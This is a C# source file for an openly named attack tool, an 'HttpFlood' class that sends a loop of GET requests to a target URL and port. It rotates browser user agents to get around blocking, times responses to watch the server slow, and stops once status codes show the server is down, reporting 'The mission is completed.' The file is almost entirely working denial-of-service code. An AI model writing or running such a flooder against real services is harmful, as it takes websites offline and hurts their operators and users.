using System;
using System.Net;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace AttackerTool
{
    public static class HttpFlood
    {
        public static async Task Start(string targetUrl, ushort port, int limit)
        {
            Console.WriteLine($"The attack tool is starting attack to {targetUrl}:{port}");

            int count = 0;
            int userAgentIndex = 0;
            // create http client for http request
            using HttpClient client = new HttpClient();

            while (count < limit)
            {
                try
                {
                    count ++;

                    // create http request message to target url with http get method
                    var request = new HttpRequestMessage(HttpMethod.Get, $"{targetUrl}:{port}");

                    // add user agent to the header to simulate the request comes from different browser
                    request.Headers.UserAgent.ParseAdd(Settings.UserAgents[userAgentIndex]);

                    // time analysis for understand whether the server gonna be slow
                    Stopwatch stopwatch = Stopwatch.StartNew();

                    // send request to get response
                    HttpResponseMessage response = await client.SendAsync(request);

                    // stop time watching
                    stopwatch.Stop();

                    // Report to analysis the attack
                    Console.WriteLine($"Attack: {count}, " +
                        $"Time: {stopwatch.ElapsedMilliseconds}ms, " +
                        $"Response: {response.StatusCode}");

                    // change user agent just in case the request blocked
                    if (isBlocked(response.StatusCode))
                    {
                        userAgentIndex = (userAgentIndex + 1) % Settings.UserAgents.Length;
                    }

                    // check whether server is down
                    if (isServerDown(response.StatusCode))
                    {
                        Console.WriteLine("Server is down. The mission is completed.");
                        return;
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Exception: {ex.Message}");
                }
            }
        }

        private static bool isBlocked(HttpStatusCode statusCode) 
        {
            if (Settings.BlockedStatusCode.Contains(statusCode))
            {
                return true;
            }
            return false;
        }

        private static bool isServerDown(HttpStatusCode statusCode)
        {
            if (Settings.ServerDownCode.Contains(statusCode))
            {
                return true;
            }
            return false;
        }
    }
}